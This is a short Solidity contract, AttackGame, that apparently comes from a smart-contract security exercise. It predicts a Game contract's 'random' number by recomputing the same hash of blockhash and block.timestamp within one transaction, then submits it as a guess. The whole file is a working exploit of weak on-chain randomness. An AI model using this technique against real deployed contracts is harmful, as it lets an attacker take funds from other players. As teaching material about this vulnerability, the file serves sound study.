// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Game.sol";

contract AttackGame {
   Game game;

   constructor(address gameAddress) payable {
      game = Game(gameAddress);
   }

   function attack() public {
      uint256 _guess = uint256(
         keccak256(abi.encodePacked(blockhash(block.number), block.timestamp))
      );
      game.guess(_guess);
   }

   receive() external payable {}

   fallback() external payable {}
}
